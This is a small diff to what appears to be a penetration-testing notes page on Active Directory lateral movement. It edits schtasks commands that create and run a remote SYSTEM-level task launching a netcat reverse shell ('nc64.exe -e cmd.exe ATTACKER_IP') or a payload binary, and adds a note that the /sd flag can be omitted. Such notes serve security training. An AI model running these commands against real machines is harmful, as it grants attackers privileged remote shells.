@@ -46,7 +46,7 @@ Suppose we have breached a machine (`mach1`) on the AD network, along with crede
 ```powershell
 # ofcourse we want to change the taskname  to something less suspicious 
 #(1)
-C:\> schtasks /create /s mach2.xxxx /ru "SYSTEM" /u "admin" /p pass /tn "revshell" /tr "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP <PORT>" /sc ONCE /sd xxxx /st xxx 
+C:\> schtasks /create /s mach2.xxxx /ru "SYSTEM" /u "admin" /p pass /tn "revshell" /tr "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP <PORT>" /sc ONCE /st xxx 
 
 #(2) same command as (1), just with different payload
 C:\> schtasks /create ... /ru "SYSTEM" /tn "revshell" /tr "%windir%\rvshell.exe"  
@@ -56,6 +56,8 @@ C:\> schtasks /run /s mach2.xxxx  /tn  "revshell"
 {% endcode %}
 
 The `/ru "SYSTEM"` option specifies to run the task as the local system account, that allows us to gain a privileged shell.
+
+Note also that we can omit the `/sd` flag for the create command.
 
 #### Cleanup
 
